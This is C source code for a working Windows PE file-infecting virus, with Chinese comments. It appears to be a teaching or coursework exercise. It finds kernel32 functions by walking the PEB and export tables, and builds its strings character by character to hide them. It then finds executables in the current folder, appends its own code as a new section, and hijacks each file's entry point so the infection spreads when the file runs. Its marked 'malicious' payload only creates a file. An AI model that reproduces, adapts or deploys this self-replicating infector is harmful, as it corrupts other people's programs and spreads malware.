#include <windows.h>
#include <winternl.h>

#pragma code_seg(".shcode")

typedef FARPROC(WINAPI *pGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
typedef HMODULE(WINAPI *pLoadLibraryA)(LPCSTR lpLibFileName);
typedef HANDLE(WINAPI *pFindFirstFileA)(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
typedef BOOL(WINAPI *pFindNextFileA)(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
typedef BOOL(WINAPI *pFindClose)(HANDLE hFindFile);
typedef HANDLE(WINAPI *pCreateFileA)(LPCTSTR lpFileName,
                                     DWORD dwDesiredAccess,
                                     DWORD dwShareMode,
                                     LPSECURITY_ATTRIBUTES lpSecurityAttributes,
                                     DWORD dwCreationDisposition,
                                     DWORD dwFlagsAndAttributes,
                                     HANDLE hTemplateFile);
typedef BOOL(WINAPI *pCloseHandle)(HANDLE hObject);
typedef DWORD(WINAPI *pGetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
typedef DWORD(WINAPI *pSetFilePointer)(HANDLE hFile,
                                       LONG lDistanceToMove,
                                       PLONG lpDistanceToMoveHigh,
                                       DWORD dwMoveMethod);
typedef BOOL(WINAPI *pReadFile)(HANDLE hFile,
                                LPVOID lpBuffer,
                                DWORD nNumberOfBytesToRead,
                                LPDWORD lpNumberOfBytesRead,
                                LPOVERLAPPED lpOverlapped);
typedef BOOL(WINAPI *pWriteFile)(HANDLE hFile,
                                 LPCVOID lpBuffer,
                                 DWORD nNumberOfBytesToWrite,
                                 LPDWORD lpNumberOfBytesWritten,
                                 LPOVERLAPPED lpOverlapped);
typedef void *(WINAPIV *pmalloc)(size_t size);
typedef void(WINAPIV *pfree)(void *memblock);
typedef void *(WINAPIV *pmemset)(void *dest, int c, size_t count);
typedef void *(WINAPIV *pmemcpy)(void *dest, const void *src, size_t count);
typedef int(WINAPIV *psystem)(const char *command);
typedef int(WINAPIV *pprintf_s)(const char *format, ...);

typedef struct {
    pCreateFileA CreateFileA;
    pCloseHandle CloseHandle;
    pGetFileSize GetFileSize;
    pSetFilePointer SetFilePointer;
    pReadFile ReadFile;
    pWriteFile WriteFile;
    pmalloc malloc;
    pfree free;
    pmemset memset;
    pmemcpy memcpy;
} FuncPointers;

int shellcode();
BOOL Func(pCreateFileA CreateFileA, pCloseHandle CloseHandle);
int Infect(PCHAR fileName, PVOID imageBase, PIMAGE_NT_HEADERS32 selfNtHdr, PCHAR shcodeName, FuncPointers *funcs);
PVOID GetModBase(PWCHAR dllName);
PVOID GetFuncAddrFromExport(PCHAR funcName, PIMAGE_EXPORT_DIRECTORY exportDir, PVOID modBase);
BOOL StrCmp(PCHAR str1, PCHAR str2);
BOOL StrCmpW(PWCHAR str1, PWCHAR str2);


int shellcode()
{
    // 获取 ImageBase 和旧入口点
    PVOID imageBase = GetModBase(NULL);
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
    PIMAGE_NT_HEADERS32 ntHeader = (PIMAGE_NT_HEADERS32)((DWORD)imageBase + dosHeader->e_lfanew);
    DWORD oldEntryPoint = *(PDWORD)((DWORD)imageBase + dosHeader->e_lfanew - 0x04) + (DWORD)imageBase;

    // 从 kernel32.dll 中获取 GetProcAddress 和 LoadLibraryA 函数
    WCHAR kernel32Name[] = {L'K', L'E', L'R', L'N', L'E', L'L', L'3', L'2', L'.', L'D', L'L', L'L', L'\0'};
    PVOID kernel32Base = GetModBase(kernel32Name);
    PIMAGE_DOS_HEADER kernel32DosHdr = (PIMAGE_DOS_HEADER)kernel32Base;
    PIMAGE_NT_HEADERS32 kernel32NtHdr = (PIMAGE_NT_HEADERS32)((DWORD)kernel32Base + kernel32DosHdr->e_lfanew);
    IMAGE_OPTIONAL_HEADER32 kernel32OptHdr = kernel32NtHdr->OptionalHeader;
    PIMAGE_EXPORT_DIRECTORY kernel32ExportDir =
            (PIMAGE_EXPORT_DIRECTORY)((DWORD)kernel32Base + kernel32OptHdr.DataDirectory[0].VirtualAddress);
    CHAR getprocaddrName[] = {'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', '\0'};
    CHAR loadlibName[] = {'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', '\0'};
    pGetProcAddress GetProcAddress =
            (pGetProcAddress)(GetFuncAddrFromExport(getprocaddrName, kernel32ExportDir, kernel32Base));
    pLoadLibraryA LoadLibraryA = (pLoadLibraryA)(GetFuncAddrFromExport(loadlibName, kernel32ExportDir, kernel32Base));

    // 导入需要的 DLL
    CHAR msvcrtName[] = {'m', 's', 'v', 'c', 'r', 't', '.', 'd', 'l', 'l', '\0'};
    HMODULE hModMsvcrt = LoadLibraryA(msvcrtName);

    // 定义需要的函数名和其他字符串
    CHAR systemName[] = {'s', 'y', 's', 't', 'e', 'm', '\0'};
    CHAR printfsName[] = {'p', 'r', 'i', 'n', 't', 'f', '_', 's', '\0'};
    CHAR createfileName[] = {'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'A', '\0'};
    CHAR closehandleName[] = {'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', '\0'};
    CHAR findfirstfileaName[] = {'F', 'i', 'n', 'd', 'F', 'i', 'r', 's', 't', 'F', 'i', 'l', 'e', 'A', '\0'};
    CHAR findnextfileaName[] = {'F', 'i', 'n', 'd', 'N', 'e', 'x', 't', 'F', 'i', 'l', 'e', 'A', '\0'};
    CHAR findcloseName[] = {'F', 'i', 'n', 'd', 'C', 'l', 'o', 's', 'e', '\0'};
    CHAR getfilesizeName[] = {'G', 'e', 't', 'F', 'i', 'l', 'e', 'S', 'i', 'z', 'e', '\0'};
    CHAR setfilepointerName[] = {'S', 'e', 't', 'F', 'i', 'l', 'e', 'P', 'o', 'i', 'n', 't', 'e', 'r', '\0'};
    CHAR readfileName[] = {'R', 'e', 'a', 'd', 'F', 'i', 'l', 'e', '\0'};
    CHAR writefileName[] = {'W', 'r', 'i', 't', 'e', 'F', 'i', 'l', 'e', '\0'};
    CHAR mallocName[] = {'m', 'a', 'l', 'l', 'o', 'c', '\0'};
    CHAR freeName[] = {'f', 'r', 'e', 'e', '\0'};
    CHAR memsetName[] = {'m', 'e', 'm', 's', 'e', 't', '\0'};
    CHAR memcpyName[] = {'m', 'e', 'm', 'c', 'p', 'y', '\0'};

    CHAR exeFileName[] = {'*', '.', 'e', 'x', 'e', '\0'};
    CHAR shcodeName[] = {'.', 's', 'h', 'c', 'o', 'd', 'e', '\0'};
    CHAR PAUSE[] = {'P', 'A', 'U', 'S', 'E', '\0'};
    CHAR SUCCESS[] = {'S', 'u', 'c', 'c', 'e', 's', 's', ':', ' ', '\0'};
    CHAR FAIL[] = {'F', 'a', 'i', 'l', ':', ' ', '\0'};
    CHAR newline[] = {'\n', '\0'};
    CHAR msgFunc[] = {'m', 'a', 'l', 'i', 'c', 'i', 'o', 'u', 's', ' ', 'f', 'u', 'n', 'c', '\0'};
    CHAR msgFdTarget[] = {'f', 'i', 'n', 'd', ' ', 't', 'a', 'r', 'g', 'e', 't', '\0'};
    CHAR msgInfect[] = {'i', 'n', 'f', 'e', 'c', 't', ' ', '\0'};
    CHAR msgInvalid[] = {'i', 'n', 'v', 'a', 'l', 'i', 'd', ' ', 'P', 'E', ' ', '\0'};
    CHAR msgInfected[] = {'i', 'n', 'f', 'e', 'c', 't', 'e', 'd', ' ', '\0'};
    CHAR msgOther[] = {'o', 't', 'h', 'e', 'r', ' ', 'e', 'r', 'r', 'o', 'r', ' ', '\0'};

    // 定义需要的函数指针
    psystem system = (psystem)GetProcAddress(hModMsvcrt, systemName);
    pprintf_s printf_s = (pprintf_s)GetProcAddress(hModMsvcrt, printfsName);
    pCreateFileA CreateFileA = (pCreateFileA)GetProcAddress((HMODULE)kernel32Base, createfileName);
    pCloseHandle CloseHandle = (pCloseHandle)GetProcAddress((HMODULE)kernel32Base, closehandleName);
    pFindFirstFileA FindFirstFileA = (pFindFirstFileA)GetProcAddress((HMODULE)kernel32Base, findfirstfileaName);
    pFindNextFileA FindNextFileA = (pFindNextFileA)GetProcAddress((HMODULE)kernel32Base, findnextfileaName);
    pFindClose FindClose = (pFindClose)GetProcAddress((HMODULE)kernel32Base, findcloseName);
    pGetFileSize GetFileSize = (pGetFileSize)GetProcAddress((HMODULE)kernel32Base, getfilesizeName);
    pSetFilePointer SetFilePointer = (pSetFilePointer)GetProcAddress((HMODULE)kernel32Base, setfilepointerName);
    pReadFile ReadFile = (pReadFile)GetProcAddress((HMODULE)kernel32Base, readfileName);
    pWriteFile WriteFile = (pWriteFile)GetProcAddress((HMODULE)kernel32Base, writefileName);
    pmalloc malloc = (pmalloc)GetProcAddress(hModMsvcrt, mallocName);
    pfree free = (pfree)GetProcAddress(hModMsvcrt, freeName);
    pmemset memset = (pmemset)GetProcAddress(hModMsvcrt, memsetName);
    pmemcpy memcpy = (pmemcpy)GetProcAddress(hModMsvcrt, memcpyName);

    // 执行恶意函数
    if (Func(CreateFileA, CloseHandle)) {
        printf_s(SUCCESS);
    } else {
        printf_s(FAIL);
    }
    printf_s(msgFunc);
    printf_s(newline);

    // 寻找感染目标
    WIN32_FIND_DATAA findFile;
    HANDLE hFind = FindFirstFileA(exeFileName, &findFile);

    FuncPointers funcs = {.CreateFileA = CreateFileA,
                          .CloseHandle = CloseHandle,
                          .GetFileSize = GetFileSize,
                          .SetFilePointer = SetFilePointer,
                          .ReadFile = ReadFile,
                          .WriteFile = WriteFile,
                          .malloc = malloc,
                          .free = free,
                          .memset = memset,
                          .memcpy = memcpy};

    if (hFind == INVALID_HANDLE_VALUE) {
        printf_s(FAIL);
        printf_s(msgFdTarget);
        printf_s(newline);
        system(PAUSE);
        __asm { jmp oldEntryPoint }
    } else {
        printf_s(SUCCESS);
        printf_s(msgFdTarget);
        printf_s(newline);
        do {
            if (findFile.dwFileAttributes != FILE_ATTRIBUTE_DIRECTORY) {
                int status = Infect(findFile.cFileName, imageBase, ntHeader, shcodeName, &funcs);
                switch (status) {
                    case 0:
                        printf_s(SUCCESS);
                        printf_s(msgInfect);
                        break;
                    case 1:
                        printf_s(FAIL);
                        printf_s(msgInvalid);
                        break;
                    case 2:
                        printf_s(FAIL);
                        printf_s(msgInfected);
                        break;
                    default:
                        printf_s(FAIL);
                        printf_s(msgOther);
                        break;
                }
                printf_s(findFile.cFileName);
                printf_s(newline);
            }
        } while (FindNextFileA(hFind, &findFile));
        FindClose(hFind);
    }

    system(PAUSE);
    __asm { jmp oldEntryPoint }
    return 0;
}

// 恶意函数
BOOL Func(pCreateFileA CreateFileA, pCloseHandle CloseHandle)
{
    CHAR msg[] = {'h', 'o', 'l', 'y', 's', 'h', 'i', 't', '\0'};
    HANDLE hFile = CreateFileA((LPCTSTR)msg,
                               GENERIC_READ | GENERIC_WRITE,
                               0,
                               NULL,
                               CREATE_ALWAYS,
                               FILE_ATTRIBUTE_NORMAL,
                               NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        CloseHandle(hFile);
        return TRUE;
    } else {
        return FALSE;
    }
}

// 感染文件，返回值：0 感染成功，1 无效PE文件，2 已感染文件，3 其他错误
int Infect(PCHAR fileName, PVOID imageBase, PIMAGE_NT_HEADERS32 selfNtHdr, PCHAR shcodeName, FuncPointers *funcs)
{
    HANDLE hFile = funcs->CreateFileA((LPCTSTR)fileName,
                                      GENERIC_READ | FILE_GENERIC_WRITE,
                                      0,
                                      NULL,
                                      OPEN_EXISTING,
                                      FILE_ATTRIBUTE_NORMAL,
                                      NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return 3;
    }

    DWORD cnt;
    // 检查目标 DOS 头
    IMAGE_DOS_HEADER dosHdr;
    funcs->SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    funcs->ReadFile(hFile, &dosHdr, sizeof(IMAGE_DOS_HEADER), &cnt, NULL);
    if (dosHdr.e_magic != IMAGE_DOS_SIGNATURE) {
        funcs->CloseHandle(hFile);
        return 1;
    }

    // 检查目标 NT 头
    IMAGE_NT_HEADERS32 ntHdr;
    funcs->SetFilePointer(hFile, dosHdr.e_lfanew, NULL, FILE_BEGIN);
    funcs->ReadFile(hFile, &ntHdr, sizeof(IMAGE_NT_HEADERS32), &cnt, NULL);
    if (ntHdr.Signature != IMAGE_NT_SIGNATURE) {
        funcs->CloseHandle(hFile);
        return 1;
    }

    // 检查目标是否已被感染
    IMAGE_SECTION_HEADER sectHdr;
    for (int i = 0; i < ntHdr.FileHeader.NumberOfSections; ++i) {
        funcs->SetFilePointer(hFile,
                              dosHdr.e_lfanew + sizeof(IMAGE_NT_HEADERS32) + i * sizeof(IMAGE_SECTION_HEADER),
                              NULL,
                              FILE_BEGIN);
        funcs->ReadFile(hFile, &sectHdr, sizeof(IMAGE_SECTION_HEADER), &cnt, NULL);
        if (StrCmp((PCHAR)sectHdr.Name, shcodeName)) {
            funcs->CloseHandle(hFile);
            return 2;
        }
    }

    // 检查是否有足够的空间插入新的节头
    DWORD hdrsSize = dosHdr.e_lfanew + sizeof(IMAGE_NT_HEADERS32) +
                     ntHdr.FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER);
    if (ntHdr.OptionalHeader.SizeOfHeaders - hdrsSize < sizeof(IMAGE_SECTION_HEADER)) {
        funcs->CloseHandle(hFile);
        return 3;
    }

    // 制作并插入 shellcode 节头
    IMAGE_SECTION_HEADER shcodeHdr, selfShcodeHdr;
    PVOID pSectHdr = IMAGE_FIRST_SECTION(selfNtHdr);
    for (int i = 0; i < selfNtHdr->FileHeader.NumberOfSections; ++i) {
        sectHdr = *(PIMAGE_SECTION_HEADER)pSectHdr;
        if (StrCmp((PCHAR)sectHdr.Name, shcodeName)) {
            selfShcodeHdr = sectHdr;
            shcodeHdr = selfShcodeHdr;
            break;
        }
        pSectHdr = (PVOID)((DWORD)pSectHdr + sizeof(IMAGE_SECTION_HEADER));
    }
    if (!StrCmp((PCHAR)sectHdr.Name, shcodeName)) {
        funcs->CloseHandle(hFile);
        return 3;
    }

    IMAGE_SECTION_HEADER lastSectHdr;
    funcs->SetFilePointer(hFile, hdrsSize - sizeof(IMAGE_SECTION_HEADER), NULL, FILE_BEGIN);
    funcs->ReadFile(hFile, &lastSectHdr, sizeof(IMAGE_SECTION_HEADER), &cnt, NULL);
    DWORD fileSize = funcs->GetFileSize(hFile, NULL);
    shcodeHdr.PointerToRawData = fileSize;
    shcodeHdr.VirtualAddress =
            lastSectHdr.VirtualAddress + (lastSectHdr.Misc.VirtualSize / ntHdr.OptionalHeader.SectionAlignment + 1) *
                                                 ntHdr.OptionalHeader.SectionAlignment;
    shcodeHdr.SizeOfRawData =
            (shcodeHdr.Misc.VirtualSize / ntHdr.OptionalHeader.FileAlignment + 1) * ntHdr.OptionalHeader.FileAlignment;

    funcs->SetFilePointer(hFile, hdrsSize, NULL, FILE_BEGIN);
    funcs->WriteFile(hFile, &shcodeHdr, sizeof(IMAGE_SECTION_HEADER), &cnt, NULL);

    // 插入 shellcode 节
    PVOID shcodeSect = funcs->malloc(shcodeHdr.SizeOfRawData);
    funcs->memset(shcodeSect, 0xCC, shcodeHdr.SizeOfRawData);
    funcs->memcpy(shcodeSect, (PVOID)((PBYTE)imageBase + selfShcodeHdr.VirtualAddress), selfShcodeHdr.Misc.VirtualSize);
    funcs->SetFilePointer(hFile, 0, NULL, FILE_END);
    funcs->WriteFile(hFile, (PBYTE)shcodeSect, shcodeHdr.SizeOfRawData, &cnt, NULL);
    funcs->free(shcodeSect);

    // 修改目标头部信息
    ntHdr.FileHeader.NumberOfSections += 1;
    ntHdr.OptionalHeader.SizeOfCode += shcodeHdr.SizeOfRawData;
    ntHdr.OptionalHeader.SizeOfImage += (shcodeHdr.Misc.VirtualSize / ntHdr.OptionalHeader.SectionAlignment + 1) *
                                        ntHdr.OptionalHeader.SectionAlignment;
    funcs->SetFilePointer(hFile, dosHdr.e_lfanew - 0x04, NULL, FILE_BEGIN);
    funcs->WriteFile(hFile, (PDWORD)(&ntHdr.OptionalHeader.AddressOfEntryPoint), 0x04, &cnt, NULL);
    ntHdr.OptionalHeader.AddressOfEntryPoint = shcodeHdr.VirtualAddress;
    funcs->SetFilePointer(hFile, dosHdr.e_lfanew, NULL, FILE_BEGIN);
    funcs->WriteFile(hFile, &ntHdr, sizeof(IMAGE_NT_HEADERS32), &cnt, NULL);
    funcs->CloseHandle(hFile);

    return 0;
}

// 获取模块基址
PVOID GetModBase(PWCHAR dllName)
{
    PVOID pFirstMod = NULL;

    __asm
    {
        push edx
        ; Get PEB
        mov edx, fs: [0x30]
        ; Get Ldr
        mov edx, [edx + 0x0c]
        ; Get InMemoryOrderModuleList.Flink
        mov edx, [edx + 0x14]
        mov pFirstMod, edx
        pop edx
    }

    if (dllName == NULL) {
        return (PVOID) * (PDWORD)((DWORD)pFirstMod + 0x10);
    } else {
        PVOID pLdrMod = (PVOID) * ((PDWORD)pFirstMod);
        while (pLdrMod != pFirstMod) {
            if (StrCmpW(dllName, (PWCHAR) * (PDWORD)((DWORD)pLdrMod + 0x28))) {
                return (PVOID) * (PDWORD)((DWORD)pLdrMod + 0x10);
            }
            pLdrMod = (PVOID) * ((PDWORD)pLdrMod);
        }
        return NULL;
    }
}

// 从导出名字表、导出序号表、导出地址表中获取函数地址
PVOID GetFuncAddrFromExport(PCHAR funcName, PIMAGE_EXPORT_DIRECTORY exportDir, PVOID modBase)
{
    PDWORD nameTab = (PDWORD)(exportDir->AddressOfNames + (DWORD)modBase);
    PWORD ordTab = (PWORD)(exportDir->AddressOfNameOrdinals + (DWORD)modBase);
    PDWORD funcTab = (PDWORD)(exportDir->AddressOfFunctions + (DWORD)modBase);
    DWORD i;
    for (i = 0; i < exportDir->NumberOfNames; ++i) {
        if (StrCmp(funcName, (PCHAR)(nameTab[i] + (DWORD)modBase))) {
            break;
        }
    }
    if (i == exportDir->NumberOfNames) {
        return NULL;
    } else {
        return (PVOID)(funcTab[ordTab[i]] + (DWORD)modBase);
    }
}

BOOL StrCmp(PCHAR str1, PCHAR str2)
{
    while (*str1 && (*str1 == *str2)) {
        ++str1;
        ++str2;
    }
    return *str1 == *str2;
}

BOOL StrCmpW(PWCHAR str1, PWCHAR str2)
{
    while (*str1 && (*str1 == *str2)) {
        ++str1;
        ++str2;
    }
    return *str1 == *str2;
}
